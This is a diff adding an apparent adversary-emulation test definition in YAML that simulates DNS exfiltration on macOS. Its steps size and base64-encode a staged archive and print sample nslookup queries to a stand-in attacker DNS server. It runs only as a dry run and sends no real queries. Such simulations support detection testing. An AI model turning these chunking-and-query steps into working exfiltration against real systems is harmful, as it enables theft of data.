@@ -1,0 +1,114 @@
+id: 009-dns-exfiltration
+name: DNS Exfiltration Simulation
+description: Simulates data exfiltration through DNS queries
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: c9d0e1f2-a3b4-4c5d-6e7f-8091a2b3c4d5
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  data_file:
+    description: File to exfiltrate via DNS
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  dns_server:
+    description: Attacker-controlled DNS server
+    type: string
+    default: "dns.attacker.example.com"
+  chunk_size:
+    description: Size of data chunks (bytes)
+    type: string
+    default: "32"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Read and prepare data
+    type: command
+    executor: bash
+    command: |
+      if [ -f '{{ args.data_file }}' ]; then
+        echo "File size: $(du -h '{{ args.data_file }}' | cut -f1)"
+        echo "Chunk size: {{ args.chunk_size }} bytes"
+        chunks=$(($(stat -f%z '{{ args.data_file }}' 2>/dev/null || echo 0) / {{ args.chunk_size }} + 1))
+        echo "Estimated DNS queries: $chunks"
+      else
+        echo "WARNING: Data file not found"
+      fi
+    cleanup: false
+  
+  - name: Generate base64 encoded chunks
+    type: command
+    executor: bash
+    command: |
+      if [ -f '{{ args.data_file }}' ]; then
+        echo "Base64 encoded size:"
+        base64 < '{{ args.data_file }}' | wc -c
+        echo "First chunk preview:"
+        base64 < '{{ args.data_file }}' | head -c 100
+        echo ""
+      fi
+    cleanup: false
+  
+  - name: Prepare DNS queries
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: DNS Exfiltration Simulation"
+        echo "Target DNS: {{ args.dns_server }}"
+        echo "Sample DNS queries:"
+        echo "  nslookup data0.exfil.{{ args.dns_server }}"
+        echo "  nslookup data1.exfil.{{ args.dns_server }}"
+        echo "  nslookup data2.exfil.{{ args.dns_server }}"
+      else
+        echo "Simulating DNS queries (dry-run only)"
+      fi
+    cleanup: false
+checks:
+  - name: File exists
+    description: Verify data file exists
+    type: command
+    command: test -f '{{ args.data_file }}'
+  
+  - name: Valid DNS server
+    description: Verify DNS server format
+    type: command
+    command: echo '{{ args.dns_server }}' | grep -qE '^[a-zA-Z0-9.-]+$' && echo "Valid DNS server"
+tests:
+  dry_run:
+    - name: Test DNS exfiltration (simulation)
+      description: Test DNS exfiltration without actual queries
+      type: basic
+      steps:
+        - name: Create test data
+          type: command
+          executor: bash
+          command: |
+            echo "Secret data for exfiltration" > /tmp/test_dns_data.txt
+            du -h /tmp/test_dns_data.txt
+        
+        - name: Simulate DNS queries
+          type: command
+          executor: bash
+          command: |
+            data=$(base64 < /tmp/test_dns_data.txt)
+            echo "Would send $data as DNS queries"
+            echo "Sample queries:"
+            echo "  query1.exfil.dns.attacker.com"
+            echo "  query2.exfil.dns.attacker.com"
+        
+        - name: Show base64 encoding
+          type: command
+          executor: bash
+          command: base64 < /tmp/test_dns_data.txt
+cleanup:
+  - name: Remove test data
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_dns_data.txt
+    ignore_errors: true
